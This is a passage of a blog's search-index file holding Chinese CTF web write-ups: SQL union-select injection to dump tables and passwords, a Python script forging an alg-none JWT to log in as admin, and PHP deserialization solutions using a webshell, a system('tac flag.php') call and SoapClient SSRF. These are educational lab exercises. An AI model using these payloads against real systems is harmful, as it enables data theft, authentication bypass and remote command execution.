<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>然后就是爆破表名了（这里也可以使用库名去爆破里面的表名）</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>接下来就是爆破列名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>l0ve1ysq1<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20220723155523482.png" alt="image-20220723155523482"></p>
<p>很容易看出来肯定是和password有关了，直接爆破列值就好了</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(password) from l0ve1ysq1#</span></span><br></pre></td></tr></table></figure>

<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDFDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>参考文章:<a href="https://blog.csdn.net/weixin_52116519/article/details/124155542">https://blog.csdn.net/weixin_52116519/article/details/124155542</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/p/4a17b156.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>入门</category>
      </categories>
      <tags>
        <tag>入门</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT</title>
    <url>/p/1bb08f7a.html</url>
    <content><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>Json web token</code>简称<code>JWT</code>，是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。</p>
<p><strong>总结成一句话，就是这是一种认证机制，让后台知道请求是来自于受信的客户端。</strong></p>
<p> 这个东西跟浏览器的<code>cookie</code>是一个作用，好比我在一个网站登录了，就可以往这个网站发送restful请求，请求的同时会捎带上<code>cookie</code>，后台检查这个<code>cookie</code>发现你是合法的，才响应你的请求。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>JWT 的原理是，服务器认证以后，生成一个 JSON 对象，发回给用户，就像下面这样。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;zzzxs&quot;</span>, </span><br><span class="line">  <span class="string">&quot;admin&quot;</span>: <span class="literal">true</span> 	 </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>详细的自己可以去网上学习一下这个知识点</p>
<p>下面以一道比赛中JWT的题目学习一下</p>
<p>[HFCTF2020]EasyLogin</p>
<p>打开之后没什么头绪，试了之后发现也不是注入之类的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151007103.png" alt="image-20230415100748974"></p>
<p>需要注册之后才能登录，admin是不行的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151019113.png" alt="image-20230415101922066"></p>
<p>注册之后有一个get flag的按钮，且显示不够权限，猜测这道题目就是要提高权限来验证之类的</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151019402.png" alt="image-20230415101900344"></p>
<p>在尝试一番之后发现是，发现app.js文件，通过查看源码，发现/static/js/app.js 页面存在提示<br> <strong>koa-static 错误配置的源码泄露</strong>（这个需要自行去了解一下，没遇到过）</p>
<p> 说明 app.js 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码（参考文章）</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151022224.png" alt="image-20230415102259132"></p>
<p>在app.js的最后一个getflag函数 中可以推测出<strong>flag在api/flag中</strong>，没有东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151031735.png" alt="image-20230415103113694"></p>
<p>应该是做了验证了，分析根目录的<code>app.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">&#x27;koa&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;koa-bodyparser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;koa-session&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> = <span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> views = <span class="built_in">require</span>(<span class="string">&#x27;koa-views&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rest = <span class="built_in">require</span>(<span class="string">&#x27;./rest&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> controller = <span class="built_in">require</span>(<span class="string">&#x27;./controller&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PORT = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"></span><br><span class="line">app.keys = [crypto.randomBytes(<span class="number">16</span>).toString(<span class="string">&#x27;hex&#x27;</span>)];</span><br><span class="line"><span class="built_in">global</span>.secrets = [];</span><br><span class="line"></span><br><span class="line">app.use(<span class="keyword">static</span>(resolve(__dirname, <span class="string">&#x27;.&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.use(views(resolve(__dirname, <span class="string">&#x27;./views&#x27;</span>), &#123;</span><br><span class="line">  <span class="attr">extension</span>: <span class="string">&#x27;pug&#x27;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;<span class="attr">key</span>: <span class="string">&#x27;sses:aok&#x27;</span>, <span class="attr">maxAge</span>: <span class="number">86400000</span>&#125;, app));</span><br><span class="line"></span><br><span class="line"><span class="comment">// parse request body:</span></span><br><span class="line">app.use(bodyParser());</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare restful service</span></span><br><span class="line">app.use(rest.restify());</span><br><span class="line"></span><br><span class="line"><span class="comment">// add controllers:</span></span><br><span class="line">app.use(controller());</span><br><span class="line"></span><br><span class="line">app.listen(PORT);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`app started at port <span class="subst">$&#123;PORT&#125;</span>...`</span>);</span><br></pre></td></tr></table></figure>

<p>发现了两个路径，顺着下去看一下js的文件</p>
<p>rest.js下存在一个</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> pathPrefix = <span class="string">&#x27;/api/&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>访问controller.js看到这样的代码<br> 遍历在controllers文件夹下的以.js结尾的文件，并且引入文件添加在router中，推断controllers文件夹下存在一个api.js文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addMapping</span>(<span class="params">router, mapping</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> url <span class="keyword">in</span> mapping) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(<span class="string">&#x27;GET &#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">4</span>);</span><br><span class="line">            router.get(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (url.startsWith(<span class="string">&#x27;POST &#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">const</span> path = url.substring(<span class="number">5</span>);</span><br><span class="line">            router.post(path, mapping[url]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`invalid URL: <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addControllers</span>(<span class="params">router, dir</span>) </span>&#123;</span><br><span class="line">    fs.readdirSync(__dirname + <span class="string">&#x27;/&#x27;</span> + dir).filter(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> f.endsWith(<span class="string">&#x27;.js&#x27;</span>);</span><br><span class="line">    &#125;).forEach(<span class="function"><span class="params">f</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> mapping = <span class="built_in">require</span>(__dirname + <span class="string">&#x27;/&#x27;</span> + dir + <span class="string">&#x27;/&#x27;</span> + f);</span><br><span class="line">        addMapping(router, mapping);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">dir</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> controllers_dir = dir || <span class="string">&#x27;controllers&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> router = <span class="built_in">require</span>(<span class="string">&#x27;koa-router&#x27;</span>)();</span><br><span class="line">    addControllers(router, controllers_dir);</span><br><span class="line">    <span class="keyword">return</span> router.routes();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>访问<code>/controllers/api.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> APIError = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).APIError;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">global</span>.secrets.length &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="built_in">global</span>.secrets = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.randomBytes(<span class="number">18</span>).toString(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="built_in">global</span>.secrets.length;</span><br><span class="line">        <span class="built_in">global</span>.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//登录验证</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.request.body;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="built_in">JSON</span>.parse(Buffer.from(token.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">console</span>.log(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="built_in">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="built_in">global</span>.secrets[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.verify(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.username &amp;&amp; password === user.password;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.session.username = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.session.username !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.readFileSync(<span class="string">&#x27;/flag&#x27;</span>).toString();</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.session.username = <span class="literal">null</span>;</span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>基本确认了是使用就jwt的身份验证</p>
<p>jwt解密网站：<a href="https://jwt.io/">https://jwt.io/</a></p>
<p>先随便弄一个账号看一下先</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151116082.png" alt="image-20230415111614019"></p>
<p>传进去那一段东西</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151115010.png" alt="image-20230415111519861"></p>
<p><a href="https://www.freebuf.com/articles/web/181261.html">https://www.freebuf.com/articles/web/181261.html</a></p>
<p><a href="https://www.cnblogs.com/z-sm/p/9125995.html">https://www.cnblogs.com/z-sm/p/9125995.html</a></p>
<blockquote>
<p>在注册时候生成一个token 由下面三部分组成<code>const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</code>登陆时再以相同的方式生成token对比。</p>
</blockquote>
<p>这个题利用的是将加密方式改为’none’ 的那种</p>
<blockquote>
<p>签名算法确保恶意用户在传输过程中不会修改JWT。但是标题中的alg字段可以更改为none。一些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证。将alg更改为none后，从JWT中删除签名数据（仅标题+’.’+ payload +’.’）并将其提交给服务器。</p>
</blockquote>
<blockquote>
<p>secretid值校验</p>
<p>要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。<br>JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过python有处理jwt的模块,根据上面分析,secretid 赋值小数,algorithm赋值none,key值是一个函数必需字段给空值就行,生成token就是authorization值的内容</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">jwt_token = jwt.encode(</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;secretid&quot;</span>: [],</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;password&quot;</span>: <span class="string">&quot;zxs&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1681528433</span></span><br><span class="line">&#125;,</span><br><span class="line">    algorithm = <span class="string">&quot;none&quot;</span>,key=<span class="string">&quot;&quot;</span></span><br><span class="line">).encode(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(jwt_token)</span><br></pre></td></tr></table></figure>

<p>验证一下</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151422507.png" alt="image-20230415113143796"></p>
<p>替换登陆包中的验证字段，注意登录用户改为jwt中对应的admin和密码zxs</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151137780.png" alt="image-20230415113706615"></p>
<p>不知道为什么使用admin登录没反应，之后随便用一个用户，抓包get flag 页面</p>
<p>将里面的cookie换成admin登录页面成功的set cookie得到了flag</p>
<p><img src="https://raw.githubusercontent.com/zxsssd/testimages/main/img/202304151422952.png" alt="image-20230415115705557"></p>
<p>参考文章：<a href="https://www.jianshu.com/p/0f76e1c69e33">https://www.jianshu.com/p/0f76e1c69e33</a></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/p/d3333ead.html</url>
    <content><![CDATA[<h1 id="反序列化：层层递进🍕🍔🍟🌭🍿"><a href="#反序列化：层层递进🍕🍔🍟🌭🍿" class="headerlink" title="反序列化：层层递进🍕🍔🍟🌭🍿"></a>反序列化：层层递进🍕🍔🍟🌭🍿</h1><h3 id="反序列化基本知识点：魔法函数"><a href="#反序列化基本知识点：魔法函数" class="headerlink" title="反序列化基本知识点：魔法函数"></a>反序列化基本知识点：魔法函数</h3><h4 id="以下都是函数判断"><a href="#以下都是函数判断" class="headerlink" title="以下都是函数判断"></a>以下都是函数判断</h4><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><p>直接进行传值就好</p>
<p>本题主要考察PHP类的一个调用，要理解代码的过程</p>
<p>本题没有魔术方法（以-开头）</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>按照图片流程执行，第一步第二步，  这题主要判断用户名和密码是不是都是6个X ，不断返回函数。将vip的false变为ture</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADFCPMNLMMGKMCOHAGOGH" alt="图片.png"><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADACPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>遇到反序列话题目，首先本地建立一个文件，然后复制代码<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>然后找到什么和flag有关的</p>
<p>本题和上一题差不多，要进行一层层的判断才能执行</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>1用户名有值的话可以进行反序列化，2，还要相等才能进行下一个判断进入3.<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADGDADCCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>先在本地进行序列化，再修改一下cookie的值，再用hackbar进行判断。本题较上一题就是多了一个cookie的值为反序列化的user。</p>
<p>与上一题一样，需要满足<code>$isVip=true</code>，不同的是看上去好像没有能让他为true的地方，这里就可以实例化一个对象，里面的isVIP是true，然后再序列化一下</p>
<h2 id="web256🐱‍👤"><a href="#web256🐱‍👤" class="headerlink" title="web256🐱‍👤"></a>web256🐱‍👤</h2><p>本题有四个判断分别是用户名和密码有值，第二个是登录成功，第三个是vip为ture，第四个是密码和用户名不同</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>这里用了魔术方法construct，也可以直接改掉false，也需要将用户名和密码改成不同值，再get传入，本题需要再</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>之后得出编码再修改cookie</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>本题其实与上一题也差不多，但是多一个backdoor的函数，要在这里调用这个函数才能进行执行getinfo，所以第一步就将new info改成backdoor，然后再进行code的修改值，上传一句话木马，之后修改cookie，再post phpinfo尝试，如果成功就直接</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>=system（’tac flag .php‘）</span><br></pre></td></tr></table></figure>

<p>。关键还是要读懂代码的判断，如何执行</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>源自网络以下</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDJDBCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>首先要看魔术方法，destruct，销毁的时候会调用，调动calss，getinof ，如果反序列化，那里的值是可以控制的，调用任意类的getinfo方法，刚好这里有一个backdoor后门类的引爆</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDICPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>本题多了一个过滤，上一题的最后我们看到了序列化之后的内容，可以发现<code>O:11</code>以及<code>O:8</code>会被正则匹配到，所以在<code>11</code>和<code>8</code>前面添上<code>+</code>号达到绕过的效果，最后再urlencode即可，</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDJCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>这里的用户名和密码无关，因为函数执行后没代码了，所以随便输入；最后的操作仍然是设置cookie，get传参随意，只要有username和password即可，并且通过post传参<code>1</code>进行命令执行。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDHCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<h2 id="web259：伪造请求"><a href="#web259：伪造请求" class="headerlink" title="web259：伪造请求"></a>web259：伪造请求</h2><h3 id="php原生类的反序列化"><a href="#php原生类的反序列化" class="headerlink" title="php原生类的反序列化"></a>php原生类的反序列化</h3><p><a href="https://www.jianshu.com/p/dd5979526540">https://www.jianshu.com/p/dd5979526540</a></p>
<p>详情查看此文章</p>
<p>本题<img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDGCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>一般遇到反序列化的题目，而本身那个php页面没用任何的已有的类，那么大概率就是考察PHP原生类的反序列化了。</p>
<p>要想得到flag，必须本地访问flag.php而且带上token，一看到是根据x-forwarded-for来判断的，第一反应是直接改xff头，但是这题不行,y4师傅说是因为有了cloudfare代理，我们无法通过本地构造XFF头实现绕过。因此这题需要利用原生类的反序列化来实现SSRF，考察的是php的SoapClient原生类的反序列化。</p>
<p>原生类反序列化利用：</p>
<p><a href="https://links.jianshu.com/go?to=https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">https://dar1in9s.github.io/2020/04/02/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a></p>
<p>而这需要打开phpstudy的根目录，找到php7.12nts的php int 在搜索。</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDFCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDDCPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
<p>之后就打开phpstudy进行网站输出，得到码之后构造？vip=代码，再进行下一步</p>
<p><img src="http://mkpt.gzmtu.edu.cn/meol/common/ckeditor/openfile.jsp?id=DBCPDDDGDADFDIDECPMNLMMGKMCOHAGOGH" alt="图片.png"></p>
]]></content>
      <categories>
        <category>web ctf</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/p/312e3d12.html</url>
    <content><![CDATA[<h1 id="信息收集🐱‍🐉🥗🥙🧃🍵🌳"><a href="#信息收集🐱‍🐉🥗🥙🧃🍵🌳" class="headerlink" title="信息收集🐱‍🐉🥗🥙🧃🍵🌳"></a>信息收集🐱‍🐉🥗🥙🧃🍵🌳</h1><p>信息收集😶</p>
